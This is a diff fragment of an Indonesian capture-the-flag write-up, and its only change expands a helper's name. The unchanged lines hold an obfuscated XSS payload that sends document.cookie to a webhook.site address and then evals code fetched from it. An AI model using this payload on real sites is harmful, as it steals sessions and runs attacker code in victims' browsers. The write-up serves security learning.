@@ -25,7 +25,7 @@ kita melakukan bypass fetch dengan payload
 <img+src%3D"x"+onerror%3D"top%5B%60fet%60%2B%60ch%60%5D%28%27https%3A%2F%2Fwebhook.site%2F7efc8b25-6507-43e7-a16a-54236fb0bd58%3Fcookie%3D%27%2Bdocument.cookie%2C+%7Bcredentials%3A+%27include%27%7D%29.then%28response+%3D>response.text%28%29%29.then%28%28body%29+%3D>%7Btop%5B%60ev%60%2B%60al%60%5D%28body%29%3B%7D%29">%0D%0A
 ```
 
-ternyata website tersebut dengan request POST di website bot mintanya id Post teresbut, setelah di bantu oleh mas [Dimas](https://github.com/dimasma0305).
+ternyata website tersebut dengan request POST di website bot mintanya id Post teresbut, setelah di bantu oleh mas [Dimas Maulana](https://github.com/dimasma0305).
 bisa mengguakan request GET
 
 ```
